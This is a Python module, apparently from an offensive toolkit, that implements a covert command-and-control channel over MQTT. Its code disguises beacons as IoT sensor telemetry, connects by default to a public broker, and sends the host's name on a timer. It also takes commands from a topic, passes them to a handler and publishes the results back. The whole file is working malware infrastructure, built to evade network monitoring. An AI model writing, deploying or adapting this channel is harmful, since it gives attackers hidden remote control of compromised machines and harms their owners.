"""MQTT C2 Channel — Covert command and control over MQTT protocol.

Blends with legitimate IoT traffic on MQTT brokers.
Uses topic-based pub/sub for beaconing and commands.
"""

import json
import os
import sys
import threading
import time
from typing import Any, Callable, Dict, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


class MQTTC2Channel:
    """C2 channel over MQTT protocol.

    Uses standard MQTT topics to beacon out and receive commands.
    Topics mimic legitimate IoT telemetry (sensor readings, status updates).
    """

    def __init__(
        self,
        broker: str = "test.mosquitto.org",
        port: int = 1883,
        client_id: Optional[str] = None,
        beacon_topic: str = "iot/v1/devices/+/telemetry",
        command_topic: str = "iot/v1/devices/+/commands",
        use_tls: bool = False,
    ):
        self.broker = broker
        self.port = port
        self.client_id = client_id or f"dev_{os.urandom(4).hex()}"
        self.beacon_topic = beacon_topic.replace("+", self.client_id)
        self.command_topic = command_topic.replace("+", self.client_id)
        self.use_tls = use_tls
        self.client = None
        self._running = False
        self._thread = None
        self._command_handler: Optional[Callable] = None
        self._connected = False

    def start(self, command_handler: Optional[Callable] = None) -> bool:
        """Start MQTT C2 channel"""
        try:
            import paho.mqtt.client as mqtt
        except ImportError:
            logger.warning("paho-mqtt not installed. Install with: pip install paho-mqtt")
            return False

        self._command_handler = command_handler
        self._running = True

        self.client = mqtt.Client(client_id=self.client_id)
        if self.use_tls:
            self.client.tls_set()

        self.client.on_connect = self._on_connect
        self.client.on_message = self._on_message
        self.client.on_disconnect = self._on_disconnect

        try:
            self.client.connect(self.broker, self.port, keepalive=60)
            self._thread = threading.Thread(target=self.client.loop_forever, daemon=True)
            self._thread.start()
            logger.info(
                f"MQTT C2 started: broker={self.broker}:{self.port} "
                f"client={self.client_id}"
            )
            return True
        except Exception as e:
            logger.error(f"MQTT C2 connection failed: {e}")
            self._running = False
            return False

    def stop(self):
        """Stop MQTT C2 channel"""
        self._running = False
        if self.client:
            self.client.disconnect()
            self.client = None
        logger.info("MQTT C2 stopped")

    def beacon(self, data: Dict[str, Any]) -> bool:
        """Send beacon data via MQTT (as sensor telemetry)"""
        if not self._connected or not self.client:
            return False
        try:
            payload = {
                "device_id": self.client_id,
                "timestamp": time.time(),
                "type": "telemetry",
                "data": data,
            }
            info = self.client.publish(self.beacon_topic, json.dumps(payload), qos=1)
            return info.rc == 0
        except Exception as e:
            logger.debug(f"MQTT beacon failed: {e}")
            return False

    def send_result(self, command_id: str, result: Any) -> bool:
        """Send command execution result back"""
        if not self._connected or not self.client:
            return False
        try:
            topic = self.command_topic.replace("/commands", "/results")
            payload = {
                "device_id": self.client_id,
                "command_id": command_id,
                "result": result,
                "timestamp": time.time(),
            }
            info = self.client.publish(topic, json.dumps(payload), qos=1)
            return info.rc == 0
        except Exception as e:
            logger.debug(f"MQTT result send failed: {e}")
            return False

    @property
    def is_connected(self) -> bool:
        return self._connected

    def _on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            self._connected = True
            client.subscribe(self.command_topic, qos=1)
            logger.success(f"MQTT connected, subscribed to {self.command_topic}")
        else:
            logger.error(f"MQTT connection failed with code {rc}")

    def _on_message(self, client, userdata, msg):
        try:
            payload = json.loads(msg.payload.decode())
            command = payload.get("command", "")
            command_id = payload.get("id", "")
            args = payload.get("args", {})

            logger.info(f"MQTT command received: {command} (id={command_id})")

            if self._command_handler:
                result = self._command_handler(command, args)
                self.send_result(command_id, result)
            else:
                logger.debug(f"No command handler registered, ignoring: {command}")
        except Exception as e:
            logger.error(f"MQTT message handling failed: {e}")

    def _on_disconnect(self, client, userdata, rc):
        self._connected = False
        if self._running:
            logger.warning("MQTT disconnected, will retry...")
            time.sleep(5)
            try:
                client.reconnect()
            except Exception:
                pass


class MQTTBeaconManager:
    """Manages beaconing schedule over MQTT C2 channel"""

    def __init__(self, channel: MQTTC2Channel, interval: int = 60):
        self.channel = channel
        self.interval = interval
        self._thread = None
        self._running = False

    def start(self):
        self._running = True
        self._thread = threading.Thread(target=self._beacon_loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False

    def _beacon_loop(self):
        while self._running:
            if self.channel.is_connected:
                self.channel.beacon({
                    "status": "active",
                    "uptime": time.time(),
                    "hostname": os.uname().nodename,
                })
            time.sleep(self.interval)
